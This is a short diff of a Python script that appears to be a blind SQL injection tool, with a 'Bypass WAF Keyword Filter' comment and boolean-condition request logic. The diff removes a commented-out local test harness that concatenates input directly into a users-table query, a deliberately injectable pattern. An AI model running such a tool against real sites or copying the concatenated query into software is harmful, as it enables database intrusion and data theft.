@@ -1,13 +1,6 @@
 from requests import post
 import logging
 
-import mysql.connector
-
-# cnx = mysql.connector.connect(user='root', password='password',
-#                               host='127.0.0.1',
-#                               database='Main')
-
-
 logging.basicConfig(level=logging.INFO)
 
 # Bypass WAF Keyword Filter
@@ -57,23 +50,6 @@ def incrementalSearch(checker, start, *argv):
         else:
             break
     return start
-
-# def send_request(sql:str):
-#     sql = "select * from users where username=''" + sql
-#     cursor = cnx.cursor()
-#     cursor.execute(sql)
-
-#     hasResult = False
-#     for (result) in cursor:
-#         hasResult = True
-
-#     cursor.close()
-
-#     if hasResult:
-#         return TRUE_CONDITION
-#     else:
-#         return FALSE_CONDITION
-    
 
 def send_request(sql:str):
 
